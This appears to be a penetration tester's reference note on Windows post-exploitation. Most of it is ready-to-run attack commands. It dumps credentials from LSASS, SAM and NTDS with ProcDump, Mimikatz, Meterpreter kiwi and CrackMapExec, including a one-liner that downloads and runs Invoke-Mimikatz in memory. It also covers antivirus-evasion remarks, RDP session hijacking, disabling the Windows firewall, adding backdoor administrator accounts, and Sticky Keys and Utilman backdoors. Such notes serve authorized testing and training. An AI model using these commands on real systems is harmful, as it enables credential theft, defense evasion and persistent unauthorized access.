# Windows - Post-Exploit

Post exploitation is the phase of operation once a target host has been
compromised, usually by gaining local Administrator / SYSTEM access.

Post exploitation should consist of:

  - Retrieving local and domain accounts as well as any sensible information
  stored on the compromised hosts
  - Implementing a way of persistence on the compromised host

### Credentials dumping

Credential dumping is the process of obtaining account login and password
information, normally in the form of a hash or a clear text password, from
the operating system.

To dump credentials on a Windows host, refer to the [Windows] Post Exploit note.

On Windows, the users password are stored in the:

  - SAM (Security Account Manager) hive, storing the LM/NTLM hashes of local
    accounts for the host
  - LSASS (Local Security Authority Subsystem) process, storing clear-text
    passwords or LM/NTLM hashes of logged on users, Kerberos tickets, etc.
  - NTDS.dit (NT Directory Services.Directory Information Tree) file, which is
    the main AD database file, stored on Domain Controllers and containing,
    notably, the LM/NTLM hashes of all domain accounts.    

Administrators / SYSTEM privileges are required to access the information stored
in those files / processes.

###### Task manager

Since Vista, the Task Manager GUI utility tool can be used to easily dump the
lsass process. To open the task manager while in a rdp session type `taskmgr`
in a command prompt.

The procedure to dump the lsass process using the task manager is as follow:

```
Details -> Right click "lsass.exe" -> Create Dump File
```

###### ProcDump

ProcDump is a command-line utility tool signed by Microsoft and part of the
sysinternals suite.

It can be used to dump the lsass process with out raising any antivirus alert on
all Windows operating systems.

```
procdump.exe -accepteula -ma lsass.exe <PATH_DMPFILE>

# Trough a meterpreter session
upload <PATH/procdump.exe> C:
execute -f "C:\procdump.exe" -a '-accepteula -ma lsass.exe C:\lsass.dmp'
download C:\lsass.dmp
rm C:\lsass.dmp
```

###### Mimikatz

Mimikatz can be used to extract plaintexts passwords, hash, PIN code and
kerberos tickets from memory.  

It can be used:

  - By uploading the mimikatz released binary on the targeted system, which will
  almost certainly raise an antivirus alert
  - By uploading a custom mimikatz binary on the targeted system, which may
  raise an antivirus alert
  - Through the injection in memory of the Invoke-mimikatz PowerShell script
  (with CME or manually), which may raise an antivirus alert
  - Through a meterpreter session by using the mimikatz or kiwi modules, which
  may raise an antivirus alert
  - By extracting the LSASS process with the Task Manager or ProcDump utilities
  and using mimikatz off target  

```
# Direct use
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# From a lsass dump
mimikatz # privilege::debug
mimikatz # sekurlsa::minidump <LSASSDMP>
mimikatz # sekurlsa::logonpasswords

# PowerShell in memory injection
# If the compromised host can not access internet, Invoke-Mimikatz.ps1 should be hosted on a local website on the attacking machine
(New-Object System.Net.WebClient).Proxy.Credentials =  [System.Net.CredentialCache]::DefaultNetworkCredentials
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds;
```

###### Meterpreter

The meterpreter module hashdump can be used to dump the SAM base on a
compromised host:

```
meterpreter> hashdump
```

The meterpreter extensions mimikatz and kiwi can be used to dump credentials
through a meterpreter session without the need to write any file to the
compromised host's disks. The kiwi extension replace the previous mimikatz
extension with a much simpler interface command system and works on Windows XP
SP3 and Windows 2003 SP1 all the way up to 10 and 2016.

On x64 host, make sure that the meterpreter session is running as a 64 bits
process (using sysinfo), otherwise meterpreter will attempt to load a 32bit
version of Mimikatz into memory, which will cause most features to be
non-functional.  

```
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> lsa_dump_sam
meterpreter> lsa_dump_secrets
meterpreter> creds_kerberos / creds_msv / creds_ssp / creds_tspkg / creds_wdigest    

# Older version
meterpreter> load mimikatz

meterpreter> mimikatz_command -f samdump::hashes
meterpreter> mimikatz_command -f sekurlsa::logonpasswords
meterpreter> kerberos / livessp / msv / ssp / tspkg / wdigest  
```

###### CrackMapExec

CrackMapExec is a framework to pentest Windows/Active Directory environments.
It can be used to dump the SAM base or the LSASS process remotely using local
administrator credentials (password or hash) if the SMB port is exposed.  

For more information about CrackMapExec refer to the [Active Directory]
Credentials theft shuffle note.  

Usage:

```
# SAM
crackmapexec <TARGETS> --sam (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# LSASS dump
crackmapexec <TARGETS> -M mimikatz (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
```

###### User-level third-party credentials

TODO

###### RDP Session Hijacking

If Administrator / SYSTEM privileges could be obtained on a host, RDP sessions
of others users can be hijacked. This could be used to access the
host as the hijacked user through a GUI interface with out knowing its password.

Note that:
  - Hijacking of disconnected sessions is possible
  - Hijacking a session will unlock locked sessions (with out the need to
    provide credentials)

Retrieve the ID of the eventual RDP sessions present on the host:

```
# SESSIONNAME = rdp-*
query user
```

Create and start a service that will execute tscon to hijack the specified RDP
session:

```
sc create sesshijack binpath= "cmd.exe /k tscon <SESSION_ID> /dest:<SESSION_NAME>"
net start sesshijack
```

### Manage

###### Windows Firewall

To check whether the Windows Firewall is enabled on a server or computer,
the following command can be used as Administrator/SYSTEM:

```
netsh advfirewall show allprofiles
```

By default, three separate listings are present: Domain profile settings,
private profile settings and public profile settings.  
With the private profile, applied to a network adapter when it is connected
to a network that is identified by the user or administrator as a private
network, Windows enables network discovery features, allows file sharing and
other networked features.   
The public profile, applied to a network adapter by default or if specified so
by an user or administrator, is the most restrictive profile. In the default
public profile, Windows will block all inbound connections to programs that are
not on the list of allowed programs.   
Finally, the Domain profile is used when a server or computer is joined to an
Active Directory domain. In this environment, firewall settings are typically
(but not necessarily) controlled by a network administrator.

To disable the firewall use the following commands:

```
# Disable current profile
netsh advfirewall set currentprofile state off

# Disable all profiles
netsh advfirewall set allprofiles state off

# Disable the private, public and domain profiles
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set domainprofile state off
```

To open a specific port, or a range, use the following command:

```
netsh advfirewall firewall add rule name="<RULE_NAME" protocol=TCP dir=in localport=<PORT> action=allow
```

### Persistence

###### Add local Administrator

The net user commands can be used to create and add a windows account in the
administrator group:

```
# Create a new account
net user /add <USERNAME> <PASSWORD>

# Add account as administrator
net localgroup Administrators <USERNAME> /add
net localgroup Administrateurs <USERNAME> /add
```

###### Sticky Keys or Utilman backdoors

Both the Sticky Keys (sethc.exe) and Utilman (utilman.exe) utility tools can be
launched at the login screen before authentication as NT AUTHORITY\SYSTEM.

Replacing either of those binaries with cmd.exe can be a way to maintain
persistence on the compromised system.

```
cd windows\system32
copy cmd.exe sethc.exe
copy cmd.exe utilman.exe
```

The sethc.exe is launched after pushing the Maj key five times and the
utilman.exe can be started using Win + u.

However, a graphical access to the host login prompt is needed in order to
make use of this backdoor mechanism.  
To do so remotely:

  - RDP must be enabled and not firewalled on the host
  - RDP NLA deactivated if no valid credentials are known (credentials of a
    user in the Remote Desktop Users group).
